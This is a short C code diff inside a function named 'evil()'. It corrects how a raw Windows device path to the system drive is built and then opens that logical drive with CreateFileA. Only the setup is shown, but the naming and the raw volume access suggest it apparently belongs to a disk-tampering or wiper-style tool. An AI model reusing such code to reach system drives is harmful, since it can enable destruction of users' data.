@@ -49,7 +49,8 @@ void evil()
 	char NUL[]="\0";
 
 	memcpy(buffer + 0, path + 0, 4);
-	memcpy(buffer + 4, system + 0, 2);
+	memcpy(buffer + 4, system + 0, 1);
+	memcpy(buffer + 5, ":" + 0, 1);
     	memcpy(buffer + 6, NUL + 0, 1);
 
 	HANDLE LogicalDrive = CreateFileA(buffer, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
